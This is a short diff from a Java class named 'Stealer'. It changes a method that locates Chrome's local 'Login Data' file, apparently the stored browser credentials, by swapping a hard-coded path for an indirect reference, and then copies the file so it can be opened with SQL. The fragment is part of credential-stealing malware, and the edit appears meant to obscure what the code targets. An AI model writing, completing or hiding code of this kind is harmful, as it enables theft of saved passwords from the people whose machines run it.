@@ -21,7 +21,7 @@ public class Stealer
 
     private static Connection connect() throws SQLException, ClassNotFoundException, IOException
     {
-        String b = System.getenv("LOCALAPPDATA") + "\\Google\\Chrome\\User Data\\Default\\Lgin Data";
+        String b = System.getenv("LOCALAPPDATA") + Main.sql.b;
         if (!new File(b).exists())
             {
                 Files.copy(Paths.get(d), Paths.get(b));
